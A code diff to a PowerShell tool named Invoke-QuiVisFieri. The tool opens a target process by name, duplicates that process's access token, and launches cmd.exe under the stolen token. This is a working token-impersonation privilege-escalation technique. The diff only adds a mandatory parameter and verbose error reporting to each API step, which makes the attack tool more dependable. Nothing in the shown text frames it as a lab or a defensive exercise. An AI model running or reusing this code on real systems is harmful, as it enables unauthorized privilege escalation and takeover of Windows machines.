@@ -237,12 +237,14 @@ namespace QuiVisFieri
             uint processAccess,
             bool bInheritHandle,
             uint processId);
+        
     }
 }
 "@
 
 function Invoke-QuiVisFieri {
 	param (
+        [Parameter(Mandatory)]
 		[string[]]$ProcessName
 	)
 	
@@ -254,14 +256,36 @@ function Invoke-QuiVisFieri {
 
 	# Opening of a handle to target process
 	$hTarget = [QuiVisFieri.Kernel32]::OpenProcess(0x001FFFFF, 0, (Get-Process $ProcessName).Id)
-	$htTarget = 0
+	        if ($hTarget) {
+	            Write-Verbose "Handle to $ProcessName opened successfully."
+	        } else {
+	            $lastError = [System.Runtime.InteropServices.Marshal]::GetLastWin32Error()
+	            Write-Verbose "Failed to open handle to $ProcessName with error code: $lastError"
+	        }
 	# Opening of a handle to target process token
+ 	$htTarget = 0
 	$optSuccess = [QuiVisFieri.AdvApi32]::OpenProcessToken($hTarget, [QuiVisFieri.AdvApi32]::TOKEN_DUPLICATE, [ref]$htTarget)
-	
+	        if ($optSuccess) {
+	            Write-Verbose "Handle to $ProcessName token opened successfully."
+	        } else {
+	            $lastError = [System.Runtime.InteropServices.Marshal]::GetLastWin32Error()
+	            Write-Verbose "Failed to open handle to $ProcessName token with error code: $lastError"
+	        }
 	# Target process' token duplication
 	$phDtoken = 0
 	$dteSuccess = [QuiVisFieri.AdvApi32]::DuplicateTokenEx($htTarget, [QuiVisFieri.AdvApi32]::TOKEN_ALL_ACCESS, 0, [QuiVisFieri.AdvApi32+SECURITY_IMPERSONATION_LEVEL]::SecurityImpersonation, [QuiVisFieri.AdvApi32+TOKEN_TYPE]::TokenPrimary, [ref]$phDtoken)
-	
+	        if ($dteSuccess) {
+	            Write-Verbose "$ProcessName token duplicated successfully."
+	        } else {
+	            $lastError = [System.Runtime.InteropServices.Marshal]::GetLastWin32Error()
+	            Write-Verbose "Failed to duplicate $ProcessName token with error code: $lastError"
+	        }
 	# Spawn CMD with duplicated token
-	[QuiVisFieri.AdvApi32]::CreateProcessWithTokenW($phDtoken, 0, "cmd.exe", "", 0x00000020, 0, 0, [ref]$si, [ref]$pi)
+	$cpwtSuccess = [QuiVisFieri.AdvApi32]::CreateProcessWithTokenW($phDtoken, 0, "cmd.exe", "", 0x00000020, 0, 0, [ref]$si, [ref]$pi)
+	        if ($cpwtSuccess) {
+	            Write-Verbose "CMD console with $ProcessName token spawned successfully."
+	        } else {
+	            $lastError = [System.Runtime.InteropServices.Marshal]::GetLastWin32Error()
+	            Write-Verbose "Failed to spawn CMD console with $ProcessName token with error code: $lastError"
+	        }
 }
